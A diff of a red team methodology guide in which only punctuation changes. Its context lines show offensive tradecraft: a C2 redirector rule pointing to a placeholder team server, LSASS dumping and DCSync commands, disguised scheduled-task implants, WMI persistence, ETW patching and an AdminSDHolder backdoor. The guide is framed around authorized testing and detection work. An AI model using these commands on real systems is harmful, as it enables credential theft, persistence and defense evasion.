@@ -1,8 +1,8 @@
 # Red Team Reference: Authorized Operator Field Guide
 
-> Authorization Notice: This reference is intended exclusively for authorized red team operators working under signed rules of engagement (ROE) and legal authorization documents. All techniques, tools, and methodologies described herein are for use in authorized security assessments only. Unauthorized use against systems you do not have explicit written permission to test is illegal and unethical. This document serves as a methodology and tradecraft reference — not a step-by-step exploitation guide.
+> Authorization Notice: This reference is intended exclusively for authorized red team operators working under signed rules of engagement (ROE) and legal authorization documents. All techniques, tools, and methodologies described herein are for use in authorized security assessments only. Unauthorized use against systems you do not have explicit written permission to test is illegal and unethical. This document serves as a methodology and tradecraft reference, not a step-by-step exploitation guide.
 
-> In one minute — This is the methodology reference for running an authorized red team engagement end to end: how to scope and govern it, how adversaries are emulated across the attack lifecycle, and how the results get turned into defensive improvements. It exists so defenders and operators share one vocabulary for what an assessment covers and how findings feed detection and hardening.
+> In one minute: This is the methodology reference for running an authorized red team engagement end to end: how to scope and govern it, how adversaries are emulated across the attack lifecycle, and how the results get turned into defensive improvements. It exists so defenders and operators share one vocabulary for what an assessment covers and how findings feed detection and hardening.
 
 | | |
 |---|---|
@@ -59,7 +59,7 @@ Tabletop Exercise: No active technical execution. Stakeholders (CISO, IR lead, l
 
 Physical Red Team: Operators attempt unauthorized physical access to facilities, data centers, or sensitive areas. Techniques include tailgating, social engineering receptionists, badge cloning, lockpicking, and dumpster diving. Requires extremely specific scope and emergency contacts.
 
-Hybrid / Compound: Most enterprise engagements combine elements — external initial access attempt, assumed breach if initial access fails, and physical component. Structure depends on maturity and objectives.
+Hybrid / Compound: Most enterprise engagements combine elements: external initial access attempt, assumed breach if initial access fails, and physical component. Structure depends on maturity and objectives.
 
 ### 1.3 Scoping Document Components
 
@@ -123,7 +123,7 @@ A well-structured ROE document typically contains:
 
 TIBER-EU (Threat Intelligence-Based Ethical Red Teaming): Developed by the European Central Bank for EU financial sector entities. Three phases: Preparation (scope, engagement rules), Threat Intelligence (targeted intelligence report on likely TTPs against that entity), Red Team Test (adversary simulation guided by TI report). Requires an accredited threat intelligence provider and red team provider. Results shared with national competent authorities. Mutual recognition agreements allow results to be accepted across jurisdictions.
 
-CBEST (UK): Framework developed by the UK Financial Conduct Authority (FCA) and Bank of England (BoE) for UK systemically important financial institutions. Similar structure to TIBER-EU — intelligence-led, threat-actor simulation. Requires Council of Registered Ethical Security Testers (CREST) accreditation for providers. Results reported to the PRA/FCA.
+CBEST (UK): Framework developed by the UK Financial Conduct Authority (FCA) and Bank of England (BoE) for UK systemically important financial institutions. Similar structure to TIBER-EU: intelligence-led, threat-actor simulation. Requires Council of Registered Ethical Security Testers (CREST) accreditation for providers. Results reported to the PRA/FCA.
 
 iCAST (Hong Kong): Intelligence-led Cyber Attack Simulation Testing framework from the Hong Kong Monetary Authority (HKMA). Applies to authorized institutions in Hong Kong. Follows TI-led red team methodology with HKMA oversight.
 
@@ -371,7 +371,7 @@ Operator calls help desk impersonating an executive or employee. Common approach
 - Impersonate an on-site technician with a badge access issue
 - Impersonate a user who received a security alert about their compromised account
 
-Identity Verification Bypass: Most help desks use weak identity verification (employee ID, manager name) — all obtainable via LinkedIn OSINT. Identify verification mechanisms during reconnaissance to adapt the pretext.
+Identity Verification Bypass: Most help desks use weak identity verification (employee ID, manager name), all obtainable via LinkedIn OSINT. Identify verification mechanisms during reconnaissance to adapt the pretext.
 
 ### 3.4 Physical Access Techniques
 
@@ -479,7 +479,7 @@ RewriteRule ^/path/(.*)$ https://TEAM_SERVER_IP:4443/$1 [L,P]
 ```
 
 Domain Selection Criteria:
-- Aged domains (purchased 6+ months prior) with established web reputation categories (news, technology, shopping — avoid "uncategorized")
+- Aged domains (purchased 6+ months prior) with established web reputation categories (news, technology, shopping; avoid "uncategorized")
 - Domains that plausibly relate to legitimate business services
 - Valid TLS certificates from trusted CAs (Let's Encrypt)
 - Configured rDNS records
@@ -489,7 +489,7 @@ DNS-Based C2: For environments with highly restrictive egress filtering (only po
 
 ### 4.3 Operational Security (OPSEC) Checklist
 
-OPSEC failures expose the red team's identity, tactics, and infrastructure — potentially alerting the real adversary the exercise is meant to simulate, or causing legal complications.
+OPSEC failures expose the red team's identity, tactics, and infrastructure, potentially alerting the real adversary the exercise is meant to simulate, or causing legal complications.
 
 Infrastructure OPSEC:
 - [ ] All team server access routes through VPN (Mullvad or similar no-log provider) before connecting to offshore VPS
@@ -544,7 +544,7 @@ Look for auto-start applications or scheduled tasks that load DLLs from writable
 ```
 
 Process Hollowing (T1055.012):
-Create a legitimate process in suspended state, unmap its memory, write shellcode/PE into the now-empty address space, adjust entry point, resume execution. The process appears legitimate in process listings. EDRs detect via memory scanning — executable regions with no backing file-on-disk are suspicious.
+Create a legitimate process in suspended state, unmap its memory, write shellcode/PE into the now-empty address space, adjust entry point, resume execution. The process appears legitimate in process listings. EDRs detect via memory scanning: executable regions with no backing file-on-disk are suspicious.
 
 Reflective DLL Injection (T1055.001):
 A DLL that contains its own loader capable of loading itself from memory without requiring the Windows loader. The DLL resolves its own imports and relocates itself. Avoids writing DLL to disk. Implementation: ReflectiveDLLInjection (by Stephen Fewer), or modern variants with additional OPSEC features.
@@ -577,7 +577,7 @@ AMSI Provider Unloading: COM-based approach to unload the registered AMSI provid
 
 Event Tracing for Windows (ETW) is used by EDR solutions to receive telemetry about process activity. Patching ETW functions prevents this telemetry from being generated.
 
-Primary targets are NtTraceEvent and EtwEventWrite. Patching approach: overwrite the first bytes of the function with a RET instruction (0xC3) or a NOP sled followed by RET. EDR solutions monitor for attempts to patch these functions — combining ETW patching with process injection into a trusted process reduces this detection surface.
+Primary targets are NtTraceEvent and EtwEventWrite. Patching approach: overwrite the first bytes of the function with a RET instruction (0xC3) or a NOP sled followed by RET. EDR solutions monitor for attempts to patch these functions: combining ETW patching with process injection into a trusted process reduces this detection surface.
 
 ### 5.5 Living off the Land Binaries (LOLBins): T1218
 
@@ -804,7 +804,7 @@ pypykatz lsa minidump lsass.dmp
 ```
 
 PPL (Protected Process Light) Bypass:
-Modern Windows systems protect LSASS as a PPL, preventing standard processes from obtaining a handle. PPL bypasses include loading vulnerable drivers (BYOVD — Bring Your Own Vulnerable Driver) that operate at kernel level.
+Modern Windows systems protect LSASS as a PPL, preventing standard processes from obtaining a handle. PPL bypasses include loading vulnerable drivers (BYOVD: Bring Your Own Vulnerable Driver) that operate at kernel level.
 
 SAM Database Extraction:
 
@@ -964,7 +964,7 @@ mimikatz # lsadump::dcsync /domain:corp.local /all /csv
 ### 8.2 Domain Persistence Techniques
 
 AdminSDHolder Backdoor (T1078.002):
-AdminSDHolder is a special AD object whose DACL is used as a template for protected groups. The SDProp process (runs every 60 minutes) resets the ACL of all protected group members to match AdminSDHolder. Adding an attacker-controlled account to AdminSDHolder's ACL propagates that access to all protected AD objects within 60 minutes — persistently, even if manually removed from the actual groups.
+AdminSDHolder is a special AD object whose DACL is used as a template for protected groups. The SDProp process (runs every 60 minutes) resets the ACL of all protected group members to match AdminSDHolder. Adding an attacker-controlled account to AdminSDHolder's ACL propagates that access to all protected AD objects within 60 minutes, persistently, even if manually removed from the actual groups.
 
 ```bash
 # Add GenericAll permission for attacker account to AdminSDHolder
@@ -1005,7 +1005,7 @@ schtasks /create /sc ONLOGON /tn "MicrosoftEdgeUpdate" /tr "C:\ProgramData\impla
 schtasks /create /sc MINUTE /mo 15 /tn "WindowsDefender" /tr "C:\Windows\Temp\implant.exe" /ru SYSTEM /f
 ```
 
-WMI Event Subscription (T1546.003) — Fileless persistence:
+WMI Event Subscription (T1546.003), fileless persistence:
 ```powershell
 $Filter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
 $Filter.Name = "UpdateFilter"
@@ -1140,7 +1140,7 @@ Standard Purple Team Loop:
 1. Red team executes a specific TTP (e.g., runs Mimikatz sekurlsa::logonpasswords)
 2. Notify blue team immediately after execution via agreed communication channel ("T1003.001 executed on HOST01 at 14:22 UTC")
 3. Blue team checks SIEM/EDR: did an alert fire? Was the event logged? Was it prioritized?
-4. Joint analysis: If detection worked: document as "detected", move to next TTP. If detection failed — identify which log source should have captured it, determine why it did not, write or tune detection rule together.
+4. Joint analysis: If detection worked: document as "detected", move to next TTP. If detection failed: identify which log source should have captured it, determine why it did not, write or tune detection rule together.
 5. Red team re-executes the same TTP to confirm the new detection rule fires.
 6. Document in VECTR: create test case, record detection status, note rule that was created.
 7. Iterate to next TTP in the exercise plan.
@@ -1313,13 +1313,13 @@ Reporting & Tracking:
 
 ### 10.2 Legal Frameworks & Authorized Testing Requirements
 
-United States — Computer Fraud and Abuse Act (CFAA):
+United States, Computer Fraud and Abuse Act (CFAA):
 The CFAA (18 U.S.C. § 1030) criminalizes unauthorized access to protected computers. The authorized access exception requires: written authorization from the asset owner or authorized representative (someone with legal authority to grant access rights), specific scope definition, and activities limited to the scope. Verbal authorization is insufficient. The authorization letter must predate any testing activity.
 
-United Kingdom — Computer Misuse Act 1990 (CMA):
+United Kingdom, Computer Misuse Act 1990 (CMA):
 Sections 1-3 cover unauthorized access offenses. The authorized user defense requires that the access was authorized by the owner or person responsible for the computer. Written authorization is strongly recommended. UK penetration testing firms often engage through CREST accreditation to provide clients with assurance of ethical standards.
 
-EU — GDPR Considerations:
+EU, GDPR Considerations:
 Even authorized testing that captures personal data (employee credentials, customer records discovered in scope) triggers GDPR obligations. ROE documents should specify data handling requirements: encrypted storage, limited access, retention period, and deletion confirmation post-engagement.
 
 Penetration Testing Agreement Requirements:
@@ -1401,4 +1401,4 @@ Key Reading & Research Sources:
 
 ---
 
-*This reference is maintained for authorized red team operators. Content reflects tradecraft knowledge as of the document version date. Frameworks, tool detection rates, and defensive capabilities evolve continuously — verify currency of specific techniques before use in engagements. All engagements require explicit written authorization.*
+*This reference is maintained for authorized red team operators. Content reflects tradecraft knowledge as of the document version date. Frameworks, tool detection rates, and defensive capabilities evolve continuously: verify currency of specific techniques before use in engagements. All engagements require explicit written authorization.*
